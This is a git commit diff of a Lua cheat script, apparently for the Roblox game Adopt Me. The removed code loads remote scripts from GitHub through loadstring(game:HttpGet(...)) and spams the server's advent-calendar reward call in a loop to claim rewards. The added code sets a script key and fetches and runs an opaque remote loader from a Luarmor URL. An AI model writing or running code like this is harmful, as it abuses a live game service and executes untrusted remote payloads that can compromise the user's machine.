a0a7dc6f5966059af5d21e1b641bdd381bf3701f
greg66n <darien95sm@hotmail.com>
2024-12-07 07:45:15 -0800

    Update adopt.lua

--- adopt.lua
+++ adopt.lua
@@ -1,16 +1,2 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/Spinzox/main/refs/heads/main/script.lua'),true))()
-wait(1)
-
-
-wait(2)  -- Initial wait time
-
-for i = 1, 25 do
-    -- Execute the same number four times rapidly
-    for j = 1, 4 do
-        local args = {i}  
-        game:GetService("ReplicatedStorage").API:FindFirstChild("WinterfestAPI/AdventCalendarTryTakeReward"):InvokeServer(unpack(args))
-    end
-    wait(0.5)  -- Wait for 0.5 seconds before moving on to the next number
-end
-wait(1)
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/greg66n/adopt/refs/heads/main/adopt1.lua'),true))()
+script_key="keyOkbUgSyCLieCMbeVqgTZOAgbKIdxjRLH"
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/138e2f78b57c8e78354ac45978d60113.lua"))()
